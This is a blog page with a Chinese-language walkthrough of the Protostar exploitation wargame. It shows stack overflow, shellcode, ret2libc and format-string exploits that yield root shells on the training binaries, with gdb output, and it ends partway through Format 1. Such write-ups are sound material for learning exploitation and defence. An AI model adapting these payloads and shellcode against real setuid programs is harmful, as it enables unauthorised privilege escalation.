<!DOCTYPE html>
<html lang="en">
    <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta http-equiv="content-type" content="text/html; charset=utf-8">

      <!-- Enable responsiveness on mobile devices-->
      <!-- viewport-fit=cover is to support iPhone X rounded corners and notch in landscape-->
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=10, viewport-fit=cover">

      <title>LuckyDog | CSUwangj&#x27;s Blog</title>

      <!-- CSS -->
      <link rel="stylesheet" href="https://CSUwangj.github.io/css/lib/font-awesome.min.css">
      <link rel="stylesheet" href="https://CSUwangj.github.io/site.css">
      <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Alegreya+Sans|Noto+Serif+SC">
      
<link rel="stylesheet" href="https://CSUwangj.github.io/custom.css">

      <!-- js -->
      <script type="text/javascript" charset="utf-8" src="https://CSUwangj.github.io/js/sidebar.js"></script>
      

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css" crossorigin="anonymous">
<script type="module">
import renderMathInElement from "https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/auto-render.mjs";
const katex_config = {
  delimiters: [
    { left: "$$", right: "$$", display: true },
    { left: "$", right: "$", display: false },
  ],
  macros: {
    // Functions
    arccot: '\\operatorname{arccot}',
    arcsec: '\\operatorname{arcsec}',
    arccsc: '\\operatorname{arccsc}',
  }
}
renderMathInElement(document.body, katex_config);
</script>


      

      
        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://CSUwangj.github.io/atom.xml">
      

      
      
    </head>

    <body>
      
      
        <header name="header">
          <div>
            <div class="logo"><a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;">LuckyDog</a></div>
            <nav class="menu">
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;" class="nav-item-home unselectable">
                  <span><i class="fa-solid fa-house"></i> Home</span>
                </a>
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;about" class="nav-item-about unselectable">
                  <span><i class="fa-solid fa-user-circle"></i> About</span>
                </a>
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;categories" class="nav-item-categories unselectable">
                  <span><i class="fa-solid fa-book"></i> Categories</span>
                </a>
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;tags" class="nav-item-tags unselectable">
                  <span><i class="fa-solid fa-tags"></i> Tags</span>
                </a>
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;archives" class="nav-item-archives unselectable">
                  <span><i class="fa-solid fa-inbox"></i> Archives</span>
                </a>
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;ZDaily" class="nav-item-dailychallenge unselectable">
                  <span><i class="fa-solid fa-calendar-check"></i> DailyChallenge</span>
                </a>
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;Webtools" class="nav-item-webtools unselectable">
                  <span><i class="fa-solid fa-toolbox"></i> Webtools</span>
                </a>
              
              
            </nav>
          </div>
        </header>
      

      <main class="content container" name="main">
        <div class="content-wrapper">
          
  <div class="post">
    <h1 class="post-title">Exploit-Exercise_Protostar全攻略+解析</h1>
    <div class="post-meta">
      
        <span class="post-meta-divider">|</span>
        <span class="post-meta-item-icon"><i class="fa-solid fa-calendar"></i></span>
        <span class="post-date">Posted on: </span>
        <time datetime=2018-07-22T14:46:15+08:00 title="post created">2018-07-22</time>
      
      
        <span class="post-meta-divider">|</span>
        <span class="post-meta-item-icon"><i class="fa-solid fa-calendar-check"></i></span>
        <span class="modify-date">Posted modified: </span>
        <time datetime=2020-08-07T02:01:26.830854+08:00 title="post modified">2020-08-07</time>
      
      
        <span class="post-meta-divider">|</span>
        <span class="post-meta-item-icon"><i class="fa-solid fa-folder"></i></span>
        <span class="in-category">In: </span>
          
            <a class="category" href="/category/WriteUp">WriteUp</a>
          
      
      <span class="post-meta-divider">|</span>
    </div>
    <div class="post-body">
      <p>目前进度：</p>
<ul>
<li><input disabled="" type="checkbox" checked=""/>
Stack 0</li>
<li><input disabled="" type="checkbox" checked=""/>
Stack 1</li>
<li><input disabled="" type="checkbox" checked=""/>
Stack 2</li>
<li><input disabled="" type="checkbox" checked=""/>
Stack 3</li>
<li><input disabled="" type="checkbox"/>
小结一：C/C++程序中的栈</li>
<li><input disabled="" type="checkbox" checked=""/>
Stack 4</li>
<li><input disabled="" type="checkbox"/>
小结二：EIP能好怎</li>
<li><input disabled="" type="checkbox" checked=""/>
Stack 5</li>
<li><input disabled="" type="checkbox"/>
小结三：shellcode</li>
<li><input disabled="" type="checkbox" checked=""/>
Stack 6</li>
<li><input disabled="" type="checkbox" checked=""/>
Stack 7</li>
<li><input disabled="" type="checkbox" checked=""/>
Format 0</li>
<li><input disabled="" type="checkbox" checked=""/>
Format 1</li>
<li><input disabled="" type="checkbox" checked=""/>
Format 2</li>
<li><input disabled="" type="checkbox" checked=""/>
Format 3</li>
<li><input disabled="" type="checkbox" checked=""/>
Format 4</li>
<li><input disabled="" type="checkbox"/>
小结四：格式化字符串</li>
<li><input disabled="" type="checkbox" checked=""/>
Heap 0</li>
<li><input disabled="" type="checkbox" checked=""/>
Heap 1</li>
<li><input disabled="" type="checkbox" checked=""/>
Heap 2</li>
<li><input disabled="" type="checkbox" checked=""/>
Heap 3</li>
<li><input disabled="" type="checkbox" checked=""/>
Net 0</li>
<li><input disabled="" type="checkbox" checked=""/>
Net 1</li>
<li><input disabled="" type="checkbox" checked=""/>
Net 2</li>
<li><input disabled="" type="checkbox" checked=""/>
Final 0</li>
<li><input disabled="" type="checkbox" checked=""/>
Final 1</li>
<li><input disabled="" type="checkbox" checked=""/>
Final 2</li>
</ul>
<span id="continue-reading"></span><h1 id="stack-0">Stack 0</h1>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ python -c &quot;print &#x27;a&#x27;*65&quot; | .&#x2F;stack0
you have changed the &#x27;modified&#x27; variable
</code></pre>
<h1 id="stack-1">Stack 1</h1>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ python -c &quot;print &#x27;a&#x27;*64+&#x27;dcba&#x27;&quot; | xargs .&#x2F;stack1
you have correctly got the variable to the right value
</code></pre>
<h1 id="stack-2">Stack 2</h1>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">GREENIE=`python -c &quot;print &#x27;a&#x27;*64+&#x27;\x0a\x0d\x0a\x0d&#x27;&quot;` .&#x2F;stack2
</code></pre>
<h1 id="stack-3">Stack 3</h1>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">(gdb) disas win
Dump of assembler code for function win:
0x08048424 &lt;win+0&gt;:     push   %ebp
0x08048425 &lt;win+1&gt;:     mov    %esp,%ebp
0x08048427 &lt;win+3&gt;:     sub    $0x18,%esp
0x0804842a &lt;win+6&gt;:     movl   $0x8048540,(%esp)
0x08048431 &lt;win+13&gt;:    call   0x8048360 &lt;puts@plt&gt;
0x08048436 &lt;win+18&gt;:    leave
0x08048437 &lt;win+19&gt;:    ret
End of assembler dump.
</code></pre>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ python -c &quot;print &#x27;a&#x27;*64+&#x27;\x23\x84\x04\x08&#x27;&quot; | .&#x2F;stack3
calling function pointer, jumping to 0x08048423
code flow successfully changed
</code></pre>
<h1 id="stack-4">Stack 4</h1>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">(gdb) disas main
Dump of assembler code for function main:
0x08048408 &lt;main+0&gt;:    push   %ebp
0x08048409 &lt;main+1&gt;:    mov    %esp,%ebp
0x0804840b &lt;main+3&gt;:    and    $0xfffffff0,%esp
0x0804840e &lt;main+6&gt;:    sub    $0x50,%esp
0x08048411 &lt;main+9&gt;:    lea    0x10(%esp),%eax
0x08048415 &lt;main+13&gt;:   mov    %eax,(%esp)
0x08048418 &lt;main+16&gt;:   call   0x804830c &lt;gets@plt&gt;
0x0804841d &lt;main+21&gt;:   leave
0x0804841e &lt;main+22&gt;:   ret
End of assembler dump.
(gdb) disas win
Dump of assembler code for function win:
0x080483f4 &lt;win+0&gt;:     push   %ebp
0x080483f5 &lt;win+1&gt;:     mov    %esp,%ebp
0x080483f7 &lt;win+3&gt;:     sub    $0x18,%esp
0x080483fa &lt;win+6&gt;:     movl   $0x80484e0,(%esp)
0x08048401 &lt;win+13&gt;:    call   0x804832c &lt;puts@plt&gt;
0x08048406 &lt;win+18&gt;:    leave
0x08048407 &lt;win+19&gt;:    ret
End of assembler dump.
</code></pre>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">echo &quot;s=&#x27;a&#x27;*64\nfor i in range(0, 26):\n  s += chr(ord(&#x27;a&#x27;)+i)\nprint s&quot; | python
### run with this pattern input
(gdb) r &lt; ~&#x2F;stack4.txt
Starting program: &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack4 &lt; ~&#x2F;stack4.txt

Program received signal SIGSEGV, Segmentation fault.
0x706f6e6d in ?? ()#That&#x27;s what we need
###
$ python -c &quot;print &#x27;a&#x27;*0x4c+&#x27;\xf4\x83\x04\x08&#x27;&quot; | .&#x2F;stack4
code flow successfully changed
Segmentation fault
</code></pre>
<h1 id="stack-5">Stack 5</h1>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ (python -c &quot;print  &#x27;\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80&#x27;+ (76-37)*&#x27;a&#x27;+&#x27;\xa0\xfc\xff\xbf&#x27;&quot;; cat) | .&#x2F;stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
</code></pre>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">(python -c &quot;print &#x27;\x89\xe5\xdb\xd2\xd9\x75\xf4\x59\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x41\x41&#x27;+(76-68)*&#x27;a&#x27;+&#x27;\xa0\xfc\xff\xbf&#x27;&quot;; cat) | .&#x2F;stack5
</code></pre>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ (python -c &quot;print &#x27;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&#x27;+(76-29)*&#x27;\xcc&#x27;+&#x27;\xa0\xfc\xff\xbf&#x27;&quot;; cat) | .&#x2F;stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
</code></pre>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ (python -c &#x27;print &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80&quot; + &quot;\xcc&quot;*(76-34) + &quot;\xa0\xfc\xff\xbf&quot;&#x27;; cat) | .&#x2F;stack5
Owned!!!
</code></pre>
<h1 id="stack-6">Stack 6</h1>
<h2 id="solution-1-duplicated-shellcode">solution 1: Duplicated Shellcode</h2>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ python -c &quot;print &#x27;b&#x27;*80&quot; |.&#x2F;stack6
input path please: got path bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
input path please: got path bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb ▒
Segmentation fault (core dumped)
</code></pre>
<p>这时在dump出来的文件里可以发现输入的东西在别处出现了</p>
<p><img src="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/1532445422307.png" alt="Duplicated Shellcode" /></p>
<p><img src="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/1532445627447.png" alt="Duplicated Shellcode2" /></p>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ (python -c &quot;print  &#x27;\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80&#x27;+ (80-37)*&#x27;a&#x27;+&#x27;\x00\xe0\xfd\xb7&#x27;&quot;; cat) | .&#x2F;stack6
input path please: got path 1▒▒▒RRRT[S_▒&#x2F;bin▒G&#x2F;&#x2F;sh@u▒;1ɰ
                                                        ̀aaaaaaaaaaaaaaaaaaaaaaaaaaa
id
uid	=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
</code></pre>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ (python -c &quot;print &#x27;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&#x27;+(80-29)*&#x27;\xcc&#x27;+&#x27;\x00\xe0\xfd\xb7&#x27;&quot;; cat) | .&#x2F;stack6
input path please: got path ▒&#x2F;sh▒%▒▒▒P▒&#x2F;binP▒▒1▒
                                                1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)

</code></pre>
<h3 id="xun-gen-jiu-di">寻根究底</h3>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ python -c &quot;print &#x27;b&#x27;*80&quot; |ltrace -S .&#x2F;stack6 | grep b7fd
SYS_brk(NULL)                                         = 0x0804a000
SYS_fcntl64(0, 1, 0, 0, 0xb7ffeff4)                   = 0
SYS_fcntl64(1, 1, 0, 1, 0xb7ffeff4)                   = 0
SYS_fcntl64(2, 1, 0, 2, 0xb7ffeff4)                   = 0
SYS_access(&quot;&#x2F;etc&#x2F;suid-debug&quot;, 00)                     = -2
SYS_access(&quot;&#x2F;etc&#x2F;ld.so.nohwcap&quot;, 00)                  = -2
SYS_mmap2(0, 8192, 3, 34, -1)                         = 0xb7fe0000
SYS_access(&quot;&#x2F;etc&#x2F;ld.so.preload&quot;, 04)                  = -2
SYS_open(&quot;&#x2F;etc&#x2F;ld.so.cache&quot;, 0, 00)                   = 3
SYS_fstat64(3, 0xbffff6d4, 0xb7ffeff4, 0xb7fff87c, 3) = 0
SYS_mmap2(0, 13796, 1, 2, 3)                          = 0xb7fdc000
SYS_close(3)                                          = 0
SYS_access(&quot;&#x2F;etc&#x2F;ld.so.nohwcap&quot;, 00)                  = -2
SYS_open(&quot;&#x2F;lib&#x2F;libc.so.6&quot;, 0, 00)                     = 3
SYS_read(3, &quot;\177ELF\001\001\001&quot;, 512)               = 512
SYS_fstat64(3, 0xbffff720, 0xb7ffeff4, 0xb7fdf21d, 0x8048268) = 0
SYS_mmap2(0, 0x144948, 5, 2050, 3)                    = 0xb7e97000
SYS_mprotect(0xb7fd5000, 4096, 0)                     = 0
SYS_mmap2(0xb7fd6000, 12288, 3, 2066, 3)              = 0xb7fd6000
SYS_mmap2(0xb7fd9000, 10568, 3, 50, -1)               = 0xb7fd9000
SYS_close(3)                                          = 0
SYS_mmap2(0, 4096, 3, 34, -1)                         = 0xb7e96000
SYS_set_thread_area(0xbffffbc0, 0xb7ffeff4, 0xb7e966c0, 1, 0) = 0
SYS_mprotect(0xb7fd6000, 8192, 1)                     = 0
SYS_mprotect(0xb7ffe000, 4096, 1)                     = 0
SYS_munmap(0xb7fdc000, 13796)                         = 0
__libc_start_main(0x80484fa, 1, 0xbffffd94, 0x8048520, 0x8048510 &lt;unfinished ...&gt;
printf(&quot;input path please: &quot; &lt;unfinished ...&gt;
SYS_fstat64(1, 0xbffff604, 0xb7fd7ff4, 0xb7fd84c0, 0x80485d0) = 0
SYS_mmap2(0, 4096, 3, 34, -1)                         = 0xb7fdf000
&lt;... printf resumed&gt; )                                = 19
fflush(0xb7fd84c0 &lt;unfinished ...&gt;
SYS_write(1, &quot;input path please: &quot;, 19)               = 19
&lt;... fflush resumed&gt; )                                = 0
gets(0xbffffc8c, 0, 0xb7fe1b28, 1, 0 &lt;unfinished ...&gt;
SYS_fstat64(0, 0xbffffb5c, 0xb7fd7ff4, 0xb7fd8420, 0xb7fd8420) = 0
SYS_mmap2(0, 4096, 3, 34, -1)                         = 0xb7fde000
SYS_read(0, &quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;..., 4096) = 81
&lt;... gets resumed&gt; )                                  = 0xbffffc8c
printf(&quot;got path %s\n&quot;, &quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;...) = 74
printf(&quot;input path please: &quot;)                         = 19
fflush(0xb7fd84c0 &lt;unfinished ...&gt;
SYS_write(1, &quot;got path bbbbbbbbbbbbbbbbbbbbbbb&quot;..., 93) = 93
&lt;... fflush resumed&gt; )                                = 0
gets(0xbffffc8c, 0xbffffc8c, 0xb7fe1b28, 1, 0 &lt;unfinished ...&gt;
SYS_read(0, &quot;&quot;, 4096)                                 = 0
&lt;... gets resumed&gt; )                                  = 0
printf(&quot;got path %s\n&quot;, &quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;...) = 98
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

</code></pre>
<h2 id="solution-2-return-to-text">solution 2: Return to .text</h2>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ (python -c &quot;print &#x27;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&#x27;+(80-29)*&#x27;\xcc&#x27;+&#x27;\xf9\x84\x04\x08&#x27;+&#x27;\x7c\xfc\xff\xbf&#x27;&quot;; cat) | .&#x2F;stack6
input path please: got path ▒&#x2F;sh▒%▒▒▒P▒&#x2F;binP▒▒1▒
                                                1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
</code></pre>
<p>后来发现这个payload是不能复用的，猜测是因为栈地址会变化的原因</p>
<h2 id="solution-3-return-to-libc">solution 3: Return to libc</h2>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">(gdb) disas main
Dump of assembler code for function main:
0x080484fa &lt;main+0&gt;:    push   %ebp
0x080484fb &lt;main+1&gt;:    mov    %esp,%ebp
0x080484fd &lt;main+3&gt;:    and    $0xfffffff0,%esp
0x08048500 &lt;main+6&gt;:    call   0x8048484 &lt;getpath&gt;
0x08048505 &lt;main+11&gt;:   mov    %ebp,%esp
0x08048507 &lt;main+13&gt;:   pop    %ebp
0x08048508 &lt;main+14&gt;:   ret
End of assembler dump.
(gdb) b *0x80484fd
Breakpoint 1 at 0x80484fd: file stack6&#x2F;stack6.c, line 26.
(gdb) r
Starting program: &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack6

Breakpoint 1, 0x080484fd in main (argc=1, argv=0xbffffd54) at stack6&#x2F;stack6.c:26
26      stack6&#x2F;stack6.c: No such file or directory.
        in stack6&#x2F;stack6.c
(gdb) p system
$2 = {&lt;text variable, no debug info&gt;} 0xb7ecffb0 &lt;__libc_system&gt;
(gdb) p exit
$3 = {&lt;text variable, no debug info&gt;} 0xb7ec60c0 &lt;*__GI_exit&gt;

(gdb) info proc map
process 16347
cmdline = &#x27;&#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack6&#x27;
cwd = &#x27;&#x2F;opt&#x2F;protostar&#x2F;bin&#x27;
exe = &#x27;&#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack6&#x27;
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0       &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack6
         0x8049000  0x804a000     0x1000          0       &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack6
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         &#x2F;lib&#x2F;libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         &#x2F;lib&#x2F;libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         &#x2F;lib&#x2F;libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         &#x2F;lib&#x2F;libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fde000 0xb7fe2000     0x4000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         &#x2F;lib&#x2F;ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         &#x2F;lib&#x2F;ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         &#x2F;lib&#x2F;ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) find 0xb7e9700,+2000000,&quot;&#x2F;bin&#x2F;sh&quot;
warning: Unable to access target memory at 0xb7e9700, halting search.
Pattern not found.
(gdb) find 0xb7e97000,+2000000,&quot;&#x2F;bin&#x2F;sh&quot;
0xb7fba23f
warning: Unable to access target memory at 0xb7fd9647, halting search.
1 pattern found.
(gdb) x&#x2F;s 0xb7fba23f
0xb7fba23f:      &quot;KIND in __gen_tempname\&quot;&quot;
</code></pre>
<p>其中一行说到**<code>0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so</code>**，所以libc是装到了这个位置，但是我们找到/bin/sh后查看那个地方却不对</p>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ strings -a -t x &#x2F;lib&#x2F;libc-2.11.2.so | grep &#x2F;bin&#x2F;sh
 11f3bf &#x2F;bin&#x2F;sh
</code></pre>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">(gdb) x&#x2F;s 0xb7fb63bf
0xb7fb63bf:      &quot;&#x2F;bin&#x2F;sh&quot;
</code></pre>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ (python -c &quot;print &#x27;a&#x27;*80+&#x27;\xb0\xff\xec\xb7&#x27;+&#x27;\xc0\x60\xec\xb7&#x27;+&#x27;\xbf\x63\xfb\xb7&#x27;&quot;; cat) | .&#x2F;stack6
input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒▒▒aaaaaaaaaaaa▒▒▒▒`췿c▒
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
</code></pre>
<h2 id="solution-4-rop-todo">solution 4: ROP（TODO）</h2>
<h2 id="can-kao-zi-liao">参考资料</h2>
<p>总览：https://resources.infosecinstitute.com/exploiting-protostar-stack-4-7/#gref</p>
<p>总览：http://www.bitforestinfo.com/2018/04/binary-exploitation-protostar-stack6_6.html</p>
<p>ret2.text：http://www.bitforestinfo.com/2018/04/binary-exploitation-protostar-stack6_20.html</p>
<p>ret2libc：https://ohexfortyone.com/2018/03/exploit-exercises-protostar-stack-6.html</p>
<p>ret2libc：https://medium.com/@airman604/protostar-stack7-walkthrough-2aa2428be3e0</p>
<p>ROP：<a rel="noopener nofollow noreferrer" target="_blank" href="https://media.blackhat.com/bh-usa-08/video/bh-us-08-Shacham/black-hat-usa-08-shacham-return-oriented-programming-hires.m4v">blackhat-Return-Oriented Programming: Exploits Without Code Injection</a></p>
<p>ROP：<a rel="noopener nofollow noreferrer" target="_blank" href="https://speakerdeck.com/l4ys/rop-qing-song-tan">ROP轻松谈</a></p>
<h1 id="stack-7">Stack 7</h1>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">msf &gt; msfelfscan stack7
[*] exec: msfelfscan stack7

Usage: &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;vendor&#x2F;bundle&#x2F;ruby&#x2F;2.5.0&#x2F;bin&#x2F;msfelfscan [mode] &lt;options&gt; [targets]

Modes:
    -j, --jump [regA,regB,regC]      Search for jump equivalent instructions
    -p, --poppopret                  Search for pop+pop+ret combinations
    -r, --regex [regex]              Search for regex match
    -a, --analyze-address [address]  Display the code at the specified address
    -b, --analyze-offset [offset]    Display the code at the specified offset

Options:
    -A, --after [bytes]              Number of bytes to show after match (-a&#x2F;-b)
    -B, --before [bytes]             Number of bytes to show before match (-a&#x2F;-b)
    -D, --disasm                     Disassemble the bytes at this address
    -I, --image-base [address]       Specify an alternate ImageBase
    -h, --help                       Show this message
msf &gt; msfelfscan --jump eax stack7
[*] exec: msfelfscan --jump eax stack7

[stack7]
0x080484bf call eax
0x080485eb call eax
</code></pre>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ (python -c &quot;print &#x27;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&#x27;+(80-29)*&#x27;\xcc&#x27;+&#x27;\xbf\x84\x04\x08&#x27;&quot;; cat) | .&#x2F;stack7
input path please: got path ▒&#x2F;sh▒%▒▒▒P▒&#x2F;binP▒▒1▒
                                                1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒̿▒▒▒▒▒▒▒▒▒▒▒̿▒
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
</code></pre>
<h1 id="format-0">Format 0</h1>
<h2 id="solution-0-stackoverflow">solution 0: stackoverflow</h2>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ python -c &quot;print &#x27;a&#x27;*64+&#x27;\xef\xbe\xad\xde&#x27;&quot; | xargs .&#x2F;format0
you have hit the target correctly :)
</code></pre>
<h2 id="solution-1-format-string">solution 1: format string</h2>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$  python -c &quot;print &#x27;%64d\xef\xbe\xad\xde&#x27;&quot; | xargs .&#x2F;format0
you have hit the target correctly :)
</code></pre>
<h1 id="format-1">Format 1</h1>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ objdump -t format1 | grep target
08049638 g     O .bss   00000004              target
$ .&#x2F;format1 `python -c &quot;print &#x27;\x38\x96\x04\x08A&#x27; +&#x27;%08x.&#x27;*127+&#x27;%08n.&#x27;+&#x27;%08x.&#x27;*22&quot;`
8A0804960c.bffff9e8.08048469.b7fd8304.b7fd7ff4.bffff9e8.08048435.bffffbb0.b7ff1040.0804845b.b7fd7ff4.08048450.00000000.bffffa68.b7eadc76.00000002.bffffa94.bffffaa0.b7fe1848.bffffa50.ffffffff.b7ffeff4.0804824d.00000001.bffffa50.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.00000000.00000000.bffffa68.e6b62d35.ccfdbb25.00000000.00000000.00000000.00000002.08048340.00000000.b7ff6210.b7eadb9b.b7ffeff4.00000002.08048340.00000000.08048361.0804841c.00000002.bffffa94.08048450.08048440.b7ff1040.bffffa8c.b7fff8f8.00000002.bffffba6.bffffbb0.00000000.bffffea4.bffffec6.bffffed0.bffffee4.bffffef6.bfffff06.bfffff19.bfffff26.bfffff31.bfffff6f.bfffff86.bfffff97.bfffffa5.bfffffbc.00000000.00000020.b7fe2414.00000021.b7fe2000.00000010.0f8bfbff.00000006.00001000.00000011.00000064.00000003.08048034.00000004.00000020.00000005.00000007.00000007.b7fe3000.00000008.00000000.00000009.08048340.0000000b.000003e9.0000000c.00000000.0000000d.000003e9.0000000e.000003e9.00000017.00000001.00000019.bffffb8b.0000001f.bffffff2.0000000f.bffffb9b.00000000.00000000.00000000.00000000.00000000.4f000000.e6ba1f47.9c250ca2.20d18978.691cdb81.00363836.00000000.2f2e0000.6d726f66.00317461..38302541.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.you have modified the target :)
</code></pre>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ i=0; while [ $i -le 200 ]; do .&#x2F;format1 `python -c &quot;print &#x27;aaaa%%%03d\\\$08x.&#x27; % $i&quot;` ; i=$((i+1)); done
